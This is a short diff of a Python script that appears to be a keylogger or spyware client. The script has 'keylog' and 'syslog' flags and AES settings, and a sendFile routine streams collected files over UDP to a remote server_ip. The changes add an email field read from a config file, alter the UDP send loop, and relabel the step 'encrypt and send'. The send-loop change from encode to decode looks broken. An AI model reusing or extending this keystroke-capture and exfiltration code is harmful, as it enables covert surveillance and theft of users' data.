@@ -43,7 +43,7 @@ name = ""
 key = ""
 syslog = False
 keylog = False
-email = "example@mail.com"
+email = ""
 
 # varubales for AES:
 BS = 16
@@ -56,6 +56,7 @@ def setupConfig():
     global key
     global syslog
     global keylog
+    global email
     f = open("./config.txt")
     config = f.readlines()
     name = config[0]
@@ -64,6 +65,7 @@ def setupConfig():
     if config[2] == '1':
         keylog = True
     key = config[3]
+    email = config[4]
 
 
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
@@ -77,7 +79,7 @@ def sendFile(filename, isSysInfo):
     clientsocket.sendto(sent_data.encode(), (server_ip, udpPort))
     l = f.read(buffer_size)
     while (l):
-        clientsocket.sendto(l.encode(), (server_ip, udpPort))
+        clientsocket.sendto(l.decode(), (server_ip, udpPort))
         l = f.read(buffer_size)
     f.close()
     clientsocket.close()
@@ -211,7 +213,7 @@ while currentTime < endTime:
         currentTime = time.time()
         endTime = time.time() + logTime
 
-        #encrypt
+        #encrypt and send
         encryptions(key, name, email, syslog, keylog)
 
 
